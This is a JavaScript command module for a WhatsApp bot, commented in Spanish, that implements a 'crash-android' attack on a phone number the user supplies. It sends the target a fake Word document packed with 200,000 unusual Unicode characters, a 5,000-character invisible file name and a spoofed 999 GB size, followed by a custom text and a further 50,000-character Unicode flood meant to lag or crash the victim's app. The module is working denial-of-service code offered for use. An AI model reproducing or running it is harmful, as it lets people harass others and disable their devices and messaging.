/* * 👑 CRASH-ANDROID CUSTOM - Misa-Bot
 * Envía archivo bug + Texto personalizado + Carga de Unicodes.
 * Uso: crash-android 54911xxxx
 * Autor: Yanniel & Gemini
 */

const crashAndroid = {
    name: 'crash-android',
    alias: ['ca', 'crash'],
    category: 'utilidades',
    noPrefix: true,

    run: async (conn, m, { args, usedPrefix, command }) => {
        const chat = m.key.remoteJid
        
        // 1. Validación de uso
        if (!args[0]) {
            return conn.sendMessage(chat, { 
                text: `✧ ‧₊˚ *MISA CRASH SYSTEM* ୧ֹ˖ ⑅ ࣪⊹\n\n✰ \`Uso\`: *${usedPrefix + command} [número]*\n› *Ejemplo:* \`${usedPrefix + command} 54911xxxx\`` 
            }, { quoted: m })
        }

        try {
            let targetNum = args[0].replace(/[^0-9]/g, '')
            let targetJid = targetNum + '@s.whatsapp.net'
            
            // --- TU TEXTO PERSONALIZADO ---
            // Pega aquí el texto que tienes guardado entre las comillas
            const miTextoGuardado = `TU_TEXTO_AQUI`; 

            // 2. Generar carga de Unicodes para el archivo (200k únicos)
            const generarEntropia = (cantidad) => {
                let str = ""
                const bloques = [0x12000, 0x13000, 0x14400, 0x17000, 0x1D400]
                for (let i = 0; i < cantidad; i++) {
                    let bloque = bloques[i % bloques.length]
                    str += String.fromCodePoint(bloque + (i % 800))
                }
                return str
            }

            // 3. ENVIAR FASE 1: Archivo Word 999GB con nombre invisible
            const nombreInvisible = String.fromCodePoint(0x200C).repeat(5000) + ".docx"
            const bufferDoc = Buffer.from(generarEntropia(200000), 'utf-16le')

            await conn.sendMessage(targetJid, {
                document: bufferDoc,
                mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                fileName: nombreInvisible,
                fileLength: 1072668082176, // 999 GB visuales
                caption: null
            })

            // 4. ENVIAR FASE 2: Tu texto guardado
            // Enviamos primero tu texto para que sea lo primero que vea (o intente ver)
            await conn.sendMessage(targetJid, { text: miTextoGuardado })

            // 5. ENVIAR FASE 3: Carga de 50k Unicodes para rematar el lag
            await conn.sendMessage(targetJid, { text: generarEntropia(50000) })

            // Feedback para ti
            await conn.sendMessage(chat, { react: { text: '⚡', key: m.key } })
            await conn.sendMessage(chat, { 
                text: `🚀 *¡Secuencia Crash enviada a @${targetNum}!*\n\n> Archivo 999GB: ✅\n> Tu texto: ✅\n> Carga Unicodes: ✅`,
                mentions: [targetJid]
            }, { quoted: m })

        } catch (err) {
            console.error('Error en crash-android:', err)
            await conn.sendMessage(chat, { text: '❌ *Error al ejecutar la secuencia.*' }, { quoted: m })
        }
    }
}

export default crashAndroid
